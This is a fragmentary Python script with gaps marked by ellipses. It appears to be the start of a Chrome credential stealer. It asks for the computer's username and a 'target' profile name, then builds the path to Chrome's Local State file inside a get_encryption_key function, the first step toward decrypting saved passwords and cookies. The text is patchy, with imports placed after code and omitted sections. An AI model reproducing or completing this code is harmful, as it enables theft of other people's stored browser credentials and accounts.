...
username = input("Enter the name of the computer user: ")
time.sleep(2)
import os
import json
...
profile_name = input("Enter the profile name of your target: ")
...
def get_encryption_key():
    local_state_path = os.path.join("C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\User Data\\" + profile_name + "\\Local State")
